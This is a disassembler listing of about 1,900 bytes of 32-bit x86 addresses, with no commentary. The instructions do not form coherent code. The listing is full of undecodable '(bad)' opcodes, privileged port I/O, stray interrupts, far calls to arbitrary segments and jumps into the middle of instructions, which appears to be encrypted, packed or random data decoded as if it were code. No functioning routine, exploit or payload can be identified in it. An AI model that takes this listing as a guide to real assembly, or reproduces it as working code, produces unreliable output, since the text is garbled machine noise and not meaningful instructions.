  41e294:	imul   esp,DWORD PTR [edi-0x6bf7492],0xc5688395
  41e29e:	out    0x7a,eax
  41e2a0:	popa   
  41e2a1:	sbb    BYTE PTR [ebp+0x59dc7fbc],bl
  41e2a7:	data16 loope 0x41e283
  41e2aa:	fist   DWORD PTR [edi+0x16ee43ec]
  41e2b0:	mov    ah,0x2b
  41e2b2:	icebp  
  41e2b3:	inc    edx
  41e2b4:	inc    edx
  41e2b5:	sub    al,0x49
  41e2b7:	add    ecx,ebp
  41e2b9:	loope  0x41e28b
  41e2bb:	jae    0x41e294
  41e2bd:	mov    edx,0x304f44f4
  41e2c2:	jno    0x41e2eb
  41e2c4:	imul   ebp,DWORD PTR [eax+ecx*1-0xd9f5440],0xffffff9f
  41e2cc:	sti    
  41e2cd:	pop    ecx
  41e2ce:	add    DWORD PTR [eax+ebp*8-0xb],eax
  41e2d2:	add    al,0x93
  41e2d4:	call   0x1b47:0xd634f42b
  41e2db:	mov    ebx,0x9c10b273
  41e2e0:	cmp    edi,DWORD PTR [esp+ebp*1]
  41e2e3:	(bad)  
  41e2e4:	adc    DWORD PTR [esi],edi
  41e2e6:	xchg   esi,eax
  41e2e7:	ror    ch,cl
  41e2e9:	repz xchg esi,eax
  41e2eb:	fiadd  DWORD PTR [edx]
  41e2ed:	jle    0x41e2d7
  41e2ef:	mov    bl,0xfa
  41e2f1:	push   ebx
  41e2f2:	and    al,0xda
  41e2f4:	xchg   ebp,eax
  41e2f5:	shl    DWORD PTR [ebx],cl
  41e2f7:	cmp    BYTE PTR [ebx-0x536d5999],dl
  41e2fd:	in     al,dx
  41e2fe:	pop    esp
  41e2ff:	xor    eax,eax
  41e301:	add    DWORD PTR ds:0xf96ff068,ebp
  41e307:	add    al,0xe8
  41e309:	into   
  41e30a:	xchg   ebp,eax
  41e30b:	jg     0x41e2f8
  41e30d:	cmp    esi,edx
  41e30f:	call   0x7ed9b8d6
  41e314:	xchg   DWORD PTR [esi],ebx
  41e316:	out    dx,al
  41e317:	sub    BYTE PTR [esi-0x13],0x3
  41e31b:	dec    ecx
  41e31c:	jg     0x41e2f4
  41e31e:	dec    ecx
  41e31f:	sbb    al,al
  41e321:	das    
  41e322:	aaa    
  41e323:	adc    DWORD PTR [edi+ebp*8],0xee6fd479
  41e32a:	and    eax,0xb06d5ea8
  41e32f:	push   esi
  41e330:	inc    esp
  41e331:	add    eax,0x47a285e8
  41e336:	pop    esp
  41e338:	dec    edx
  41e339:	pop    eax
  41e33a:	int    0x1d
  41e33c:	add    al,0x9a
  41e33e:	add    eax,0x19205550
  41e343:	cld    
  41e344:	mov    al,ds:0x767480f5
  41e349:	call   0x41864a8a
  41e34e:	ins    BYTE PTR es:[edi],dx
  41e34f:	mov    dh,0xb2
  41e351:	pusha  
  41e352:	cmp    bl,bh
  41e354:	sbb    BYTE PTR [ebp+0x4d],bl
  41e357:	mov    bh,0x7
  41e359:	clc    
  41e35a:	cmp    al,0xa6
  41e35c:	mov    dl,0x17
  41e35e:	mov    ah,0xf1
  41e360:	pop    ecx
  41e361:	enter  0x33ff,0x16
  41e365:	pop    ebx
  41e366:	sub    bh,BYTE PTR [edi+0x31]
  41e369:	aad    0x42
  41e36b:	lahf   
  41e36c:	xor    eax,edx
  41e36e:	dec    eax
  41e36f:	mov    edi,DWORD PTR [edi]
  41e371:	mov    esp,0x88eacecc
  41e376:	cmp    ah,dl
  41e378:	sbb    BYTE PTR [eax],0xb7
  41e37b:	mov    BYTE PTR [edx+0x10],dh
  41e37e:	jle    0x41e3f0
  41e380:	add    al,0x50
  41e382:	int    0x11
  41e384:	int3   
  41e385:	sbb    al,0x20
  41e387:	pop    eax
  41e388:	mov    DWORD PTR [eax],0x8fc997ff
  41e38e:	stc    
  41e38f:	mov    ebx,0x7ae17f19
  41e394:	jns    0x41e35c
  41e396:	ja     0x41e416
  41e398:	nop
  41e399:	push   DWORD PTR [eax]
  41e39b:	or     eax,0x15727aab
  41e3a0:	fnstcw WORD PTR [ecx+eax*8]
  41e3a3:	sbb    al,0x8c
  41e3a5:	jbe    0x41e370
  41e3a7:	lds    edi,FWORD PTR [ebx+0x3f]
  41e3aa:	repnz or esi,DWORD PTR [eax-0x78cc0b40]
  41e3b1:	and    DWORD PTR [ebx],ebp
  41e3b3:	fisubr DWORD PTR [ebx-0x7e]
  41e3b6:	xchg   ebx,eax
  41e3b7:	and    dh,BYTE PTR [edx]
  41e3b9:	(bad)  
  41e3ba:	rcl    DWORD PTR [eax],1
  41e3bc:	ds ja  0x41e372
  41e3bf:	je     0x41e390
  41e3c1:	add    al,0x85
  41e3c3:	scas   eax,DWORD PTR es:[edi]
  41e3c4:	jmp    0x41e367
  41e3c6:	mov    dh,0xff
  41e3c8:	xchg   ebx,eax
  41e3c9:	adc    edx,DWORD PTR [ebp-0x203b9a23]
  41e3cf:	cmc    
  41e3d0:	mov    al,0xb6
  41e3d2:	and    ebx,DWORD PTR [edx+0x147d9c9a]
  41e3d8:	sti    
  41e3d9:	inc    esp
  41e3da:	mov    WORD PTR [edx+0x18],es
  41e3dd:	sub    ebp,eax
  41e3df:	ficom  DWORD PTR [edx]
  41e3e1:	int    0xb9
  41e3e3:	mov    BYTE PTR [ebx-0x14d5a04],0xea
  41e3ea:	mov    ds:0xbf532fc6,eax
  41e3ef:	popf   
  41e3f0:	xchg   edx,eax
  41e3f1:	and    al,0xae
  41e3f3:	mov    eax,0xbf642436
  41e3f8:	outs   dx,BYTE PTR ds:[esi]
  41e3f9:	jns    0x41e450
  41e3fb:	int    0x82
  41e3fd:	call   ebx
  41e3ff:	xchg   esi,eax
  41e400:	mov    ch,0x49
  41e402:	or     al,0xf7
  41e404:	xchg   BYTE PTR [ecx+0x12],cl
  41e407:	fild   QWORD PTR [ebx-0x5dd21005]
  41e40d:	scas   eax,DWORD PTR es:[edi]
  41e40e:	addr16 pop esi
  41e410:	loope  0x41e41d
  41e412:	(bad)  
  41e413:	dec    DWORD PTR [eax-0x3846e45c]
  41e419:	jne    0x41e3e1
  41e41b:	mov    edi,0x4fa83b11
  41e420:	mov    al,0xce
  41e422:	adc    DWORD PTR [ebp+0x47],ebp
  41e425:	add    edi,DWORD PTR [esi+0xf]
  41e428:	lds    esi,FWORD PTR [ecx-0x17]
  41e42b:	dec    eax
  41e42c:	or     eax,0xb4b1b9aa
  41e431:	out    0x3c,eax
  41e433:	daa    
  41e434:	dec    ecx
  41e435:	jns    0x41e421
  41e437:	rol    ebp,0xd6
  41e43a:	cmp    al,cl
  41e43c:	cwde   
  41e43d:	sbb    al,0x6d
  41e43f:	fsubr  QWORD PTR [edi-0x3d5d8b61]
  41e445:	lea    eax,[eax+0x61043adf]
  41e44b:	jg     0x41e3dc
  41e44d:	mov    ebp,0x88db5042
  41e452:	loopne 0x41e43d
  41e454:	add    DWORD PTR [ebx+0x3d768b73],esi
  41e45a:	xor    DWORD PTR [ebx-0x46],edi
  41e45d:	mov    ds:0x25196bf0,eax
  41e462:	fidivr DWORD PTR [edx-0x3578f5f7]
  41e468:	addr16 push edi
  41e46a:	call   0x6747:0xe247dce4
  41e471:	outs   dx,DWORD PTR ds:[esi]
  41e472:	sub    al,0x24
  41e474:	imul   ebp,DWORD PTR [ebx-0x52],0x3b
  41e478:	inc    edi
  41e479:	(bad)  
  41e47a:	adc    BYTE PTR [edx],bl
  41e47c:	repz in eax,0x52
  41e47f:	cld    
  41e480:	in     eax,0x6b
  41e482:	jle    0x41e40e
  41e484:	cmp    bh,BYTE PTR [esi-0x13]
  41e487:	loopne 0x41e46d
  41e489:	pop    ds
  41e48a:	xchg   ecx,eax
  41e48b:	dec    eax
  41e48c:	sbb    edi,eax
  41e48e:	into   
  41e48f:	int3   
  41e490:	push   cs
  41e491:	(bad)  
  41e492:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e493:	xchg   ebp,eax
  41e494:	inc    ebp
  41e495:	pusha  
  41e496:	into   
  41e497:	je     0x41e447
  41e499:	mov    ebx,0x0
	...
  41e512:	add    BYTE PTR [eax],al
  41e514:	inc    ecx
  41e515:	inc    BYTE PTR [ebx+eiz*1-0x1188441]
  41e51c:	push   ecx
  41e51d:	jecxz  0x41e544
  41e51f:	arpl   WORD PTR [esi+0x64],bx
  41e522:	jmp    0x41e4e8
  41e524:	mov    DWORD PTR [eax+0x76e0001],eax
  41e52a:	add    BYTE PTR [eax],al
  41e52c:	push   cs
  41e52d:	push   ecx
  41e52e:	aad    0xe9
  41e530:	dec    edx
  41e531:	sub    al,0x35
  41e533:	cmp    esp,ebx
  41e535:	out    0x3,eax
  41e537:	pop    ss
  41e538:	xchg   edx,eax
  41e539:	dec    eax
  41e53a:	imul   ebx,DWORD PTR [edx-0x7e0e3d64],0xffffffee
  41e541:	or     eax,edi
  41e543:	pop    ebx
  41e544:	dec    ebx
  41e545:	jmp    DWORD PTR [edx-0x37]
  41e548:	pop    ebx
  41e549:	inc    edx
  41e54a:	push   esi
  41e54b:	jge    0x41e56a
  41e54d:	mov    cl,0x6b
  41e54f:	retf   
  41e550:	jge    0x41e55f
  41e552:	xor    BYTE PTR [esi-0x4bc6e0c1],ah
  41e558:	inc    edx
  41e559:	inc    edx
  41e55a:	dec    eax
  41e55b:	xchg   eax,ebx
  41e55d:	dec    edi
  41e55e:	or     ah,BYTE PTR [edi]
  41e560:	ins    DWORD PTR es:[edi],dx
  41e561:	xor    DWORD PTR [esi],0x8f2be3a6
  41e567:	add    al,0x77
  41e569:	dec    esp
  41e56a:	test   BYTE PTR [esi],bh
  41e56c:	sub    DWORD PTR [eax],esp
  41e56e:	iret   
  41e56f:	call   0x2263:0x7feb7d52
  41e576:	sub    DWORD PTR [edi-0x40],esp
  41e579:	and    bl,BYTE PTR [eax]
  41e57b:	ret    0x407e
  41e57e:	fadd   QWORD PTR [esi-0x30a91b84]
  41e584:	sti    
  41e585:	stc    
  41e586:	test   ch,dh
  41e588:	pop    ds
  41e589:	sbb    eax,0x53a7d603
  41e58e:	lock test eax,0x8a55fbd0
  41e594:	dec    edx
  41e595:	push   0xffffffa6
  41e597:	dec    ecx
  41e598:	sub    BYTE PTR [eax+0x776951c8],bh
  41e59e:	clc    
  41e59f:	fstp   DWORD PTR [eax-0x4dc147da]
  41e5a5:	pop    ecx
  41e5a6:	iret   
  41e5a7:	push   ebx
  41e5a8:	aaa    
  41e5a9:	shr    DWORD PTR [esi],0x72
  41e5ac:	jae    0x41e61c
  41e5ae:	sti    
  41e5af:	(bad)  [ebp+edi*4+0x3c]
  41e5b3:	cdq    
  41e5b4:	jl     0x41e5a8
  41e5b6:	mov    ds:0xb3f72eae,eax
  41e5bb:	push   es
  41e5bc:	push   es
  41e5bd:	out    0xce,al
  41e5bf:	mov    ebp,0x7a1e2dbd
  41e5c4:	int3   
  41e5c5:	outs   dx,BYTE PTR ds:[esi]
  41e5c6:	and    eax,0x301d9950
  41e5cb:	mov    cl,ch
  41e5cd:	or     eax,0xadb85ec1
  41e5d2:	xor    eax,0x4944bfe1
  41e5d8:	mov    cl,0x88
  41e5da:	fisub  WORD PTR [ebp-0x63c53a41]
  41e5e0:	push   0xa
  41e5e2:	jle    0x41e5d8
  41e5e4:	bnd jno 0x41e60f
  41e5e7:	sbb    BYTE PTR [ebx-0x7b9d5eb6],bl
  41e5ed:	dec    ebp
  41e5ee:	cmp    ch,BYTE PTR [esi+eax*2+0x16]
  41e5f2:	jbe    0x41e59c
  41e5f4:	dec    edi
  41e5f5:	das    
  41e5f6:	je     0x41e60e
  41e5f8:	lds    edi,FWORD PTR [esi+0x2]
  41e5fb:	mov    ebx,0x7f0713e0
  41e600:	loop   0x41e664
  41e602:	or     dl,bh
  41e604:	adc    ebx,DWORD PTR [edi]
  41e606:	pop    ds
  41e607:	dec    ecx
  41e608:	fwait
  41e609:	int    0x94
  41e60b:	mov    BYTE PTR [esi-0x14],dh
  41e60e:	cmp    ah,ch
  41e610:	(bad)
  41e613:	dec    esp
  41e614:	ficom  DWORD PTR [eax+0x7d226e2b]
  41e61a:	pop    ebx
  41e61b:	xchg   edi,eax
  41e61c:	icebp  
  41e61d:	aad    0x5c
  41e61f:	(bad)
  41e624:	dec    ebx
  41e625:	add    eax,0x8091e86b
  41e62a:	pop    esi
  41e62b:	or     dh,BYTE PTR [edx+ebp*2-0x17]
  41e62f:	cwde   
  41e630:	retf   0xea99
  41e633:	mov    BYTE PTR [ebx+0x38],al
  41e636:	and    ah,BYTE PTR ds:0xefc8dd48
  41e63c:	inc    esi
  41e63d:	sbb    al,0x2b
  41e63f:	or     dl,ch
  41e641:	or     al,0x3
  41e643:	xchg   DWORD PTR [ecx],edi
  41e645:	adc    eax,0x6d3c493d
  41e64a:	xor    dh,cl
  41e64c:	adc    BYTE PTR [ecx-0x1e],0x26
  41e650:	dec    edi
  41e651:	stc    
  41e652:	fs jmp 0x76648d8d
  41e658:	mov    bh,0xcc
  41e65a:	adc    ebp,ecx
  41e65c:	jmp    0xe5042d3c
  41e661:	mov    BYTE PTR [eax-0x79],dh
  41e664:	adc    BYTE PTR [edi+0x68de2e3b],bh
  41e66a:	aaa    
  41e66b:	dec    ebx
  41e66c:	cdq    
  41e66d:	cmp    eax,0xe0caae3b
  41e672:	into   
  41e673:	mov    bh,0xc6
  41e675:	nop
  41e676:	xchg   esp,eax
  41e677:	cmp    edx,DWORD PTR [ebx+esi*2-0x37]
  41e67b:	sbb    cl,0xa6
  41e67e:	xor    esi,DWORD PTR [ebx]
  41e680:	jecxz  0x41e6d3
  41e682:	adc    DWORD PTR ds:0x6e617143,eax
  41e688:	(bad)  [edi+edi*1+0x5c]
  41e68c:	dec    ebp
  41e68d:	pop    ecx
  41e68e:	dec    esi
  41e68f:	stc    
  41e690:	(bad)  
  41e691:	xchg   ebp,eax
  41e692:	fwait
  41e693:	pop    ds
  41e694:	(bad)  
  41e695:	ret    
  41e696:	stc    
  41e697:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e698:	clc    
  41e699:	mov    ah,0xf6
  41e69b:	sub    eax,0xa5e1ff9a
  41e6a0:	les    esi,FWORD PTR [esi]
  41e6a2:	(bad)  
  41e6a3:	icebp  
  41e6a4:	fdivp  st(3),st
  41e6a6:	add    eax,0x2b68418a
  41e6ab:	sbb    BYTE PTR [esi-0x6116da55],cl
  41e6b1:	and    eax,0xd1330ff4
  41e6b6:	cmp    eax,DWORD PTR [edx-0x51]
  41e6b9:	pop    ds
  41e6ba:	pop    eax
  41e6bb:	js     0x41e658
  41e6bd:	dec    ebx
  41e6be:	scas   eax,DWORD PTR es:[edi]
  41e6bf:	aam    0xdc
  41e6c1:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  41e6c3:	push   esi
  41e6c4:	pop    ebx
  41e6c5:	test   ebp,ebx
  41e6c7:	je     0x41e6f8
  41e6c9:	shl    BYTE PTR [ebx-0x61655e75],cl
  41e6cf:	outs   dx,DWORD PTR ds:[esi]
  41e6d0:	cmp    BYTE PTR [esi],bh
  41e6d2:	lods   al,BYTE PTR ds:[esi]
  41e6d3:	add    eax,0xaa083933
  41e6d8:	(bad)  
  41e6d9:	and    DWORD PTR [edx],esi
  41e6db:	clc    
  41e6dc:	jne    0x41e723
  41e6de:	xor    ch,BYTE PTR [ebx]
  41e6e0:	fs push esp
  41e6e2:	adc    eax,0xb69c3e7f
  41e6e7:	sar    BYTE PTR [edi],cl
  41e6e9:	inc    ebp
  41e6ea:	lds    esp,FWORD PTR [ecx-0xd]
  41e6ed:	mov    cl,0x53
  41e6ef:	scas   al,BYTE PTR es:[edi]
  41e6f0:	adc    al,0x87
  41e6f2:	cld    
  41e6f3:	jmp    0xefd80106
  41e6f8:	into   
  41e6f9:	mov    esp,0xded4beb0
  41e6fe:	aaa    
  41e6ff:	test   DWORD PTR [ecx],0xe0167935
  41e705:	xchg   edx,eax
  41e706:	pop    esi
  41e707:	mov    ch,0x27
  41e709:	repz scas al,BYTE PTR es:[edi]
  41e70b:	into   
  41e70c:	mov    ecx,0x977f0b19
  41e711:	mov    ds:0xe746a033,eax
  41e716:	add    al,0x30
  41e718:	shl    edi,0x3
  41e71b:	das    
  41e71c:	iret   
  41e71d:	repnz xchg edx,eax
  41e71f:	sbb    eax,0xef9677df
  41e724:	pop    esi
  41e725:	jne    0x41e74d
  41e727:	in     al,dx
  41e728:	pushf  
  41e729:	fisub  DWORD PTR [esi]
  41e72b:	pop    ebx
  41e72c:	and    DWORD PTR [edx+0x5ccd6c74],edi
  41e732:	repz cli 
  41e734:	jmp    0xad99:0xbb5dbbdc
  41e73b:	dec    eax
  41e73c:	mov    ah,0xf0
  41e73e:	(bad)  
  41e73f:	lock and DWORD PTR [esi+0xd],esi
  41e743:	scas   eax,DWORD PTR es:[edi]
  41e744:	iret   
  41e745:	out    dx,al
  41e746:	into   
  41e747:	icebp  
  41e748:	stos   DWORD PTR es:[edi],eax
  41e749:	mov    esi,0x22a86510
  41e74e:	(bad)  
  41e74f:	pusha  
  41e750:	cld    
  41e751:	adc    bl,dh
  41e753:	xchg   ecx,eax
  41e754:	hlt    
  41e755:	and    eax,0x98fd0707
  41e75a:	or     al,0x3
  41e75c:	les    eax,FWORD PTR [ecx+0x2d86a6a8]
  41e762:	jo     0x41e78a
  41e764:	call   0x4c00:0x15b4c8ad
  41e76b:	add    DWORD PTR [ecx],ecx
  41e76d:	into   
  41e76e:	gs xchg edx,eax
  41e770:	pop    ecx
  41e771:	push   ss
  41e772:	push   eax
  41e773:	repnz retf 0xcee7
  41e777:	mov    ch,0x91
  41e779:	or     al,0xcc
  41e77b:	call   0x9444bc36
  41e780:	ja     0x41e784
  41e782:	out    0x56,al
  41e784:	and    al,0x56
  41e786:	arpl   dx,sp
  41e788:	inc    ebx
  41e78a:	aad    0x9a
  41e78c:	in     eax,0x3e
  41e78e:	cmp    dh,BYTE PTR [edi-0x33]
  41e791:	push   esp
  41e792:	mov    al,0xa
  41e794:	sub    dh,BYTE PTR [edi+0x3c]
  41e797:	sbb    BYTE PTR [ebx+ebp*4],cl
  41e79a:	pop    ds
  41e79b:	in     al,0x36
  41e79d:	aam    0x2b
  41e79f:	xlat   BYTE PTR ds:[ebx]
  41e7a0:	retf   
  41e7a1:	pop    ecx
  41e7a2:	mov    ch,0x1a
  41e7a4:	mov    ds:0x18e0093f,eax
  41e7a9:	pop    eax
  41e7aa:	mov    BYTE PTR [edi+0x203ad56e],0x4f
  41e7b1:	scas   al,BYTE PTR es:[edi]
  41e7b2:	and    bh,0x94
  41e7b5:	dec    esp
  41e7b6:	fidivr DWORD PTR [ebx-0x6]
  41e7b9:	jge    0x41e73d
  41e7bb:	xlat   BYTE PTR ds:[ebx]
  41e7bc:	aad    0x56
  41e7be:	fidiv  WORD PTR [eax+0x4bc84ab8]
  41e7c4:	jne    0x41e7e1
  41e7c6:	sub    al,BYTE PTR [esi+0x79ab1bab]
  41e7cc:	adc    al,0xe6
  41e7ce:	addr16 gs pop edx
  41e7d1:	test   DWORD PTR [ebx+esi*8+0x4b],0x61a894e1
  41e7d9:	(bad)  
  41e7db:	fcomp  QWORD PTR gs:[edx]
  41e7de:	call   0x4241:0xc41a8618
  41e7e5:	push   esi
  41e7e6:	inc    esi
  41e7e7:	dec    edi
  41e7e8:	int3   
  41e7e9:	jns    0x41e7e0
  41e7eb:	lods   ax,WORD PTR ds:[esi]
  41e7ed:	into   
  41e7ee:	sbb    al,0x38
  41e7f0:	adc    dl,BYTE PTR [ecx+0x4fd10184]
  41e7f6:	stos   DWORD PTR es:[edi],eax
  41e7f7:	add    DWORD PTR [edx+0x78278a64],ebp
  41e7fd:	(bad)  
  41e7fe:	xor    al,0x73
  41e800:	in     eax,0x5b
  41e802:	fcompp 
  41e804:	aad    0x8c
  41e806:	cmp    BYTE PTR [ebx+ebp*8],dh
  41e809:	jo     0x41e833
  41e80b:	push   0xb7d47f51
  41e810:	push   edi
  41e811:	in     eax,0x78
  41e813:	nop
  41e814:	sub    cl,BYTE PTR [esi+0x21]
  41e817:	jle    0x41e7de
  41e819:	push   0xdf1ad02d
  41e81e:	jge    0x41e82d
  41e820:	pop    ebp
  41e821:	hlt    
  41e822:	loope  0x41e7f2
  41e824:	cld    
  41e825:	fnstsw WORD PTR [edx+esi*1]
  41e828:	mov    bh,0x0
  41e82a:	lods   al,BYTE PTR ds:[esi]
  41e82b:	fucomp st(4)
  41e82d:	mov    bl,0x27
  41e82f:	pop    ds
  41e830:	pop    edi
  41e831:	mov    ah,0xec
  41e833:	mov    ds:0x935f51d4,eax
  41e838:	jle    0x41e8a8
  41e83a:	leave  
  41e83b:	and    DWORD PTR [ebp-0x4d],edx
  41e83e:	fisttp WORD PTR [ecx+edx*8+0x6]
  41e842:	sti    
  41e843:	mov    edi,0x4f1d4939
  41e848:	xchg   ecx,eax
  41e849:	not    BYTE PTR [edx+edi*4]
  41e84c:	add    esi,DWORD PTR [ecx-0x3f]
  41e84f:	loope  0x41e83d
  41e851:	aaa    
  41e852:	into   
  41e853:	mov    ecx,0x45bdaf92
  41e858:	mov    esp,0xa00f6380
  41e85d:	add    BYTE PTR [edx],cl
  41e85f:	enter  0x2c6e,0x26
  41e863:	stos   BYTE PTR es:[edi],al
  41e864:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e865:	retf   
  41e866:	push   0xffffffba
  41e868:	test   DWORD PTR [ebp-0xc],eax
  41e86b:	jb     0x41e874
  41e86d:	mov    ebp,0x9f3d65c7
  41e872:	or     ebx,DWORD PTR ds:0x78a349f1
  41e878:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e879:	scas   eax,DWORD PTR es:[edi]
  41e87a:	sub    eax,0x50dcad24
  41e87f:	sub    eax,0x992ed7e0
  41e884:	je     0x41e826
  41e886:	ret    0xf37d
  41e889:	je     0x41e839
  41e88b:	mov    ebp,0xa21ed23
  41e890:	fisub  DWORD PTR [ecx+0x1b85db81]
  41e896:	stc    
  41e897:	test   ebx,esp
  41e899:	mov    edi,0x13f2248a
  41e89e:	pushf  
  41e89f:	daa    
  41e8a0:	stos   DWORD PTR es:[edi],eax
  41e8a1:	dec    ch
  41e8a3:	leave  
  41e8a4:	sub    BYTE PTR [edi],0xef
  41e8a7:	sar    BYTE PTR [edi+0x3e],1
  41e8aa:	xchg   esi,eax
  41e8ab:	ret    
  41e8ac:	stos   DWORD PTR es:[edi],eax
  41e8ad:	ds dec esi
  41e8af:	push   es
  41e8b0:	or     al,0x6a
  41e8b2:	scas   al,BYTE PTR es:[edi]
  41e8b3:	xor    esi,DWORD PTR [esi]
  41e8b5:	std    
  41e8b6:	fcom   DWORD PTR [ebx]
  41e8b8:	sar    al,cl
  41e8ba:	sbb    cl,BYTE PTR [eax+0x22cbe2cf]
  41e8c0:	sbb    eax,0x2affb717
  41e8c5:	inc    ebp
  41e8c6:	and    edx,ecx
  41e8c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e8c9:	pusha  
  41e8ca:	std    
  41e8cb:	sub    BYTE PTR [edi],bh
  41e8cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e8ce:	stc    
  41e8cf:	pop    ds
  41e8d0:	lods   al,BYTE PTR ds:[esi]
  41e8d1:	int3   
  41e8d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e8d3:	push   esi
  41e8d4:	cmc    
  41e8d5:	lds    esi,FWORD PTR [ecx-0x35]
  41e8d8:	inc    ebp
  41e8d9:	mov    edi,0x4e28cd0c
  41e8de:	outs   dx,BYTE PTR ds:[esi]
  41e8df:	(bad)  
  41e8e0:	and    bl,al
  41e8e2:	fisttp QWORD PTR [edx-0x7313ecf2]
  41e8e8:	dec    eax
  41e8e9:	xchg   edx,eax
  41e8ea:	lock loop 0x41e963
  41e8ed:	jmp    0x41e940
  41e8ef:	sub    al,bl
  41e8f1:	add    al,0x9c
  41e8f3:	ins    BYTE PTR es:[edi],dx
  41e8f4:	xchg   BYTE PTR [ebp-0x1f980fcb],bl
  41e8fa:	jmp    0x77043b9
  41e8ff:	int3   
  41e900:	mov    al,ds:0xa59ec2e0
  41e905:	outs   dx,BYTE PTR ds:[esi]
  41e906:	adc    al,0xf
  41e908:	fs aaa 
  41e90a:	aaa    
  41e90b:	push   ebp
  41e90c:	xchg   edi,eax
  41e90d:	push   ebx
  41e90e:	xor    ecx,DWORD PTR [ebp-0x3344a4fc]
  41e914:	ins    BYTE PTR es:[edi],dx
  41e915:	dec    esi
  41e916:	xchg   edx,eax
  41e917:	jbe    0x41e8b9
  41e919:	fiadd  DWORD PTR [ecx+ebx*2]
  41e91c:	outs   dx,DWORD PTR ds:[esi]
  41e91d:	ss cwde 
  41e91f:	sti    
  41e920:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e921:	aad    0x3
  41e923:	xchg   ebx,eax
  41e924:	inc    edi
  41e925:	or     cl,BYTE PTR [esi]
  41e927:	push   0xc149628e
  41e92c:	add    eax,0x8a0393d1
  41e931:	ja     0x41e98b
  41e933:	mov    al,ds:0xf7b8f503
  41e938:	aaa    
  41e939:	fcom   st(1)
  41e93b:	push   ds
  41e93c:	ins    DWORD PTR es:[edi],dx
  41e93d:	mov    esp,DWORD PTR [ecx-0x25758d09]
  41e943:	and    eax,0x7c1c3e
  41e948:	jg     0x41e931
  41e94a:	test   eax,0x4308803c
  41e94f:	loop   0x41e8e3
  41e951:	fiadd  WORD PTR [eax]
  41e953:	fs ret 
  41e955:	call   0x254a:0x1e85908c
  41e95c:	jo     0x41e9b0
  41e95e:	test   al,0x2
  41e960:	mov    fs:0x780a4f,al
  41e966:	loope  0x41e9e7
  41e968:	in     al,dx
  41e969:	xor    cl,BYTE PTR [edi-0x7dfc9bd2]
  41e96f:	add    dl,bh
  41e971:	mov    esi,0x8c89a1c4
  41e976:	in     eax,0xa4
  41e978:	and    al,0x57
  41e97a:	jne    0x41e92d
  41e97c:	and    bh,BYTE PTR [eax]
  41e97e:	mov    eax,ds:0xc734fef2
  41e983:	mov    ds:0x408696a8,eax
  41e988:	sub    eax,0xef89dd29
  41e98d:	mov    ss,WORD PTR [esi-0x28]
  41e990:	es mov esp,0x7d3a9836
  41e996:	or     al,0x2c
  41e998:	mov    DWORD PTR [ebp+0x4fa12da5],0x2ae4d5f9
  41e9a2:	int3   
  41e9a3:	sub    bl,BYTE PTR [eax+0x5448ec76]
  41e9a9:	in     al,0xcd
  41e9ab:	xor    ebx,esi
  41e9ad:	dec    edi
  41e9ae:	push   0xbc453750
  41e9b3:	inc    ebx
  41e9b4:	addr16 xchg ecx,eax
  41e9b6:	add    ecx,DWORD PTR [ebp+0x67e10d95]
  41e9bc:	das    
  41e9bd:	shl    esp,0xc1
  41e9c0:	jmp    0x41e9f5
  41e9c2:	mov    cl,0x67
  41e9c4:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  41e9c6:	das    
  41e9c7:	jo     0x41e9d3
  41e9c9:	not    BYTE PTR [eax+edx*8]
  41e9cc:	shr    esp,0x5f
  41e9cf:	mov    bh,0xc5
  41e9d1:	jno    0x41ea48
  41e9d3:	arpl   WORD PTR [edx],si
  41e9d5:	adc    eax,0x7c097a3a
  41e9da:	call   0x37110c2c
  41e9df:	test   dh,cl
  41e9e1:	mov    ds:0x202b2c93,ax
  41e9e7:	test   cl,0xd7
  41e9ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e9eb:	adc    cl,BYTE PTR [edi]
  41e9ed:	mov    esp,0xc3084693
  41e9f2:	dec    edi
  41e9f3:	call   0x93d3:0x3a6ae7b2
  41e9fa:	sub    cx,dx
  41e9fd:	xchg   ebp,eax
  41e9fe:	pop    esp
  41e9ff:	pop    eax
  41ea00:	xor    ebx,DWORD PTR [eax]
  41ea02:	inc    ebx
  41ea03:	sbb    ah,BYTE PTR [edx+0x2e682e5c]
  41ea09:	xor    edi,edi
  41ea0b:	retf   0x35a8
  41ea0e:	mov    esi,0x301a97ba
  41ea13:	dec    edi
  41ea14:	mov    ds:0x43f7c1c6,eax
  41ea19:	pop    esi
  41ea1a:	std    
  41ea1b:	out    dx,al
  41ea1c:	lock mov al,ds:0x42cd7122
  41ea22:	shl    BYTE PTR [edx],1
  41ea24:	sbb    al,0xe8
  41ea26:	push   ebx
  41ea27:	repnz loopne 0x41ea10
  41ea2a:	les    eax,FWORD PTR [ebp-0x43a3ea54]
  41ea30:	retf   
  41ea31:	push   ecx
  41ea32:	add    bh,dl
  41ea34:	ins    BYTE PTR es:[edi],dx
  41ea35:	sbb    DWORD PTR [esi+edx*4+0x276d8e09],ebx
  41ea3c:	mov    ds:0x73d6339f,al
  41ea41:	pop    esp
  41ea42:	pop    eax
  41ea43:	cmp    edi,eax
  41ea45:	and    al,0x2f
  41ea47:	loope  0x41e9f9
  41ea49:	mov    cs,WORD PTR [ecx+ecx*1]
  41ea4c:	jge    0x41eabd
  41ea4e:	out    dx,al
  41ea4f:	repnz rcr edx,1
  41ea52:	push   edi
  41ea53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea54:	push   esi
  41ea55:	cli    
  41ea56:	pop    ecx
  41ea57:	or     esi,DWORD PTR [esi]
  41ea59:	js     0x744e60f8
  41ea5f:	mov    ch,0xfd
  41ea61:	fidivr WORD PTR es:[esi]
  41ea64:	sub    eax,0xe54c01aa
  41ea69:	retf   
  41ea6a:	sti    
  41ea6b:	or     BYTE PTR [ecx+0x15],dh
  41ea6e:	shl    BYTE PTR [edx-0x35],0x76
  41ea72:	sub    ebp,edi
  41ea74:	jno    0x41ead4
  41ea76:	in     al,dx
  41ea77:	xchg   esp,eax
  41ea78:	adc    ebx,esi
  41ea7a:	pop    eax
  41ea7b:	inc    esp
